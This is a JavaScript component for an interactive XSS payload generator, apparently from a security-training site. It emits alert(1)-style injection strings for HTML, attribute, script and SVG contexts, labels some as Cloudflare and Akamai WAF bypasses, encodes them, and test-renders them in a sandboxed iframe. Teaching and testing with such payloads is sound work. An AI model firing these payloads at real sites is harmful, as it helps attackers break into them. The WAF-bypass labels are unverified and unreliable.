/**
 * Payload Generator Component
 * Interactive UI for building XSS Payloads dynamically.
 */

class PayloadGenerator {
    constructor(mountId) {
        this.mountEl = document.getElementById(mountId);
        if (!this.mountEl) return;
        
        this.vulnType = this.mountEl.getAttribute('data-vuln') || 'xss';
        
        this.state = {
            context: 'html',
            waf: 'none',
            encoding: 'none',
            domain: 'evil.com'
        };

        this.initUI();
        this.updatePayload();
    }

    initUI() {
        this.mountEl.innerHTML = `
            <div class="cyber-card payload-gen-card" style="border-top: 3px solid var(--neon-cyan); margin-top: 20px;">
                <div class="card-header" style="display: flex; justify-content: space-between; align-items: center;">
                    <h3 style="margin:0; color: var(--neon-cyan);">⚙️ Interactive Payload Generator</h3>
                </div>
                
                <div style="padding-top: 15px;">
                    <!-- Context Selector -->
                    <div style="margin-bottom: 20px;">
                        <h5 style="color: #8be9fd; margin-bottom: 8px;">Injection Context</h5>
                        <div class="pg-toggles context-toggles" style="display: flex; gap: 10px; flex-wrap: wrap;">
                            <button class="pg-btn active" data-val="html">HTML Body</button>
                            <button class="pg-btn" data-val="attribute">HTML Attribute</button>
                            <button class="pg-btn" data-val="script">Inside &lt;script&gt;</button>
                            <button class="pg-btn" data-val="svg">SVG Context</button>
                        </div>
                    </div>

                    <!-- WAF Bypass -->
                    <div style="margin-bottom: 20px;">
                        <h5 style="color: #50fa7b; margin-bottom: 8px;">WAF Bypass Level</h5>
                        <div class="pg-toggles waf-toggles" style="display: flex; gap: 10px; flex-wrap: wrap;">
                            <button class="pg-btn active" data-val="none">Standard</button>
                            <button class="pg-btn" data-val="cloudflare">Cloudflare</button>
                            <button class="pg-btn" data-val="akamai">Akamai</button>
                            <button class="pg-btn" data-val="nospace">No Spaces</button>
                        </div>
                    </div>

                    <!-- Encoding -->
                    <div style="margin-bottom: 20px;">
                        <h5 style="color: #ffb86c; margin-bottom: 8px;">Encoding</h5>
                        <div class="pg-toggles encoding-toggles" style="display: flex; gap: 10px; flex-wrap: wrap;">
                            <button class="pg-btn active" data-val="none">Plain</button>
                            <button class="pg-btn" data-val="url">URL Encode</button>
                            <button class="pg-btn" data-val="html">HTML Entity</button>
                            <button class="pg-btn" data-val="base64">Base64</button>
                        </div>
                    </div>

                    <!-- Output Terminal -->
                    <div style="margin-top: 25px; position: relative;">
                        <div style="background: rgba(0, 229, 255, 0.1); border: 1px solid rgba(0, 229, 255, 0.3); padding: 5px 10px; border-radius: 4px 4px 0 0; display: flex; justify-content: space-between; align-items: center;">
                            <span style="color: var(--neon-cyan); font-family: var(--font-mono); font-size: 0.85rem;">Generated Payload</span>
                            <button id="pg-copy-btn" style="background: transparent; border: none; color: #aaa; cursor: pointer; display: flex; align-items: center; gap: 5px; font-size: 0.85rem; transition: color 0.2s;">
                                📋 Copy
                            </button>
                        </div>
                        <div style="background: #000; border: 1px solid #334155; border-top: none; border-radius: 0 0 4px 4px; padding: 15px; font-family: var(--font-mono); overflow-x: auto;">
                            <code id="pg-output" style="color: #50fa7b; font-size: 0.95rem; word-break: break-all;"></code>
                        </div>
                    </div>

                    <!-- Sandbox Iframe for Testing -->
                    <div style="margin-top: 15px;">
                        <h5 style="color: #bd93f9; margin-bottom: 8px;">Live Render Test</h5>
                        <div style="border: 1px dashed #6272a4; padding: 10px; border-radius: 4px; background: rgba(0,0,0,0.5);">
                            <iframe id="pg-sandbox" style="width: 100%; height: 60px; border: none; background: transparent;" sandbox="allow-scripts"></iframe>
                        </div>
                        <p style="font-size: 0.8rem; color: #6272a4; margin-top: 5px;">If the payload executes, the iframe will show an alert dialog.</p>
                    </div>
                </div>
            </div>

            <style>
                .pg-btn {
                    background: rgba(255, 255, 255, 0.05);
                    border: 1px solid #334155;
                    color: #94a3b8;
                    padding: 8px 16px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-family: var(--font-mono);
                    font-size: 0.85rem;
                    transition: all 0.2s;
                }
                .pg-btn:hover {
                    background: rgba(255, 255, 255, 0.1);
                    color: #fff;
                }
                .context-toggles .pg-btn.active {
                    background: rgba(139, 233, 253, 0.1);
                    border-color: #8be9fd;
                    color: #8be9fd;
                    box-shadow: 0 0 10px rgba(139, 233, 253, 0.2);
                }
                .waf-toggles .pg-btn.active {
                    background: rgba(80, 250, 123, 0.1);
                    border-color: #50fa7b;
                    color: #50fa7b;
                    box-shadow: 0 0 10px rgba(80, 250, 123, 0.2);
                }
                .encoding-toggles .pg-btn.active {
                    background: rgba(255, 184, 108, 0.1);
                    border-color: #ffb86c;
                    color: #ffb86c;
                    box-shadow: 0 0 10px rgba(255, 184, 108, 0.2);
                }
            </style>
        `;

        this.bindEvents();
    }

    bindEvents() {
        // Toggle Buttons
        const groups = [
            { selector: '.context-toggles .pg-btn', key: 'context' },
            { selector: '.waf-toggles .pg-btn', key: 'waf' },
            { selector: '.encoding-toggles .pg-btn', key: 'encoding' }
        ];

        groups.forEach(group => {
            const btns = this.mountEl.querySelectorAll(group.selector);
            btns.forEach(btn => {
                btn.addEventListener('click', (e) => {
                    btns.forEach(b => b.classList.remove('active'));
                    e.target.classList.add('active');
                    this.state[group.key] = e.target.getAttribute('data-val');
                    this.updatePayload();
                });
            });
        });

        // Copy Button
        const copyBtn = this.mountEl.querySelector('#pg-copy-btn');
        copyBtn.addEventListener('click', () => {
            const output = this.mountEl.querySelector('#pg-output').innerText;
            navigator.clipboard.writeText(output).then(() => {
                copyBtn.innerHTML = '✅ Copied!';
                copyBtn.style.color = '#50fa7b';
                setTimeout(() => {
                    copyBtn.innerHTML = '📋 Copy';
                    copyBtn.style.color = '#aaa';
                }, 2000);
            });
        });
    }

    generateXSS() {
        let payload = '';

        // 1. Base Payload by WAF & Context
        if (this.state.context === 'html') {
            if (this.state.waf === 'none') {
                payload = `<script>alert(1)</script>`;
            } else if (this.state.waf === 'cloudflare') {
                payload = `<svg onload=prompt(1)>`;
            } else if (this.state.waf === 'akamai') {
                payload = `<a href="javascript:alert(1)">Click</a>`;
            } else if (this.state.waf === 'nospace') {
                payload = `<svg/onload=alert(1)>`;
            }
        } 
        else if (this.state.context === 'attribute') {
            if (this.state.waf === 'none') {
                payload = `"><script>alert(1)</script>`;
            } else if (this.state.waf === 'cloudflare') {
                payload = `" onmouseover="prompt(1)" x="`;
            } else if (this.state.waf === 'akamai') {
                payload = `javascript:alert(1)`;
            } else if (this.state.waf === 'nospace') {
                payload = `"onfocus=alert(1) autofocus x="`;
            }
        }
        else if (this.state.context === 'script') {
            if (this.state.waf === 'none') {
                payload = `';alert(1);//`;
            } else if (this.state.waf === 'cloudflare') {
                payload = `'-prompt(1)-'`;
            } else if (this.state.waf === 'akamai') {
                payload = `</script><svg onload=alert(1)>`;
            } else if (this.state.waf === 'nospace') {
                payload = `';alert(1)//`;
            }
        }
        else if (this.state.context === 'svg') {
            if (this.state.waf === 'none') {
                payload = `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`;
            } else if (this.state.waf === 'cloudflare') {
                payload = `<svg><script>prompt(1)</script>`;
            } else if (this.state.waf === 'akamai') {
                payload = `<svg><script xlink:href="data:,alert(1)"></script>`;
            } else if (this.state.waf === 'nospace') {
                payload = `<svg><set/attributeName=onkeyup/onkeyup=alert(1)>`;
            }
        }

        // 2. Apply Encoding
        if (this.state.encoding === 'url') {
            payload = encodeURIComponent(payload);
        } else if (this.state.encoding === 'html') {
            payload = payload.replace(/&/g, '&amp;')
                             .replace(/</g, '&lt;')
                             .replace(/>/g, '&gt;')
                             .replace(/"/g, '&quot;')
                             .replace(/'/g, '&#39;');
        } else if (this.state.encoding === 'base64') {
            payload = btoa(payload);
        }

        return payload;
    }

    updatePayload() {
        const out = this.mountEl.querySelector('#pg-output');
        const iframe = this.mountEl.querySelector('#pg-sandbox');
        if (!out) return;
        
        let finalPayload = '';
        if (this.vulnType === 'xss') {
            finalPayload = this.generateXSS();
        }
        
        out.innerText = finalPayload;

        // Render to sandbox if it's plain unencoded HTML to test
        if (iframe && this.state.encoding === 'none') {
            let wrappedPayload = finalPayload;
            if (this.state.context === 'attribute') {
                wrappedPayload = `<input type="text" value="${finalPayload}">`;
            } else if (this.state.context === 'script') {
                wrappedPayload = `<script>var x='${finalPayload}';</script>`;
            }
            
            iframe.srcdoc = `<html><body>${wrappedPayload}</body></html>`;
        }
    }
}

// Auto-initialize when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const mounts = document.querySelectorAll('[data-component="payload_generator"]');
    mounts.forEach(mount => {
        new PayloadGenerator(mount.id);
    });
});
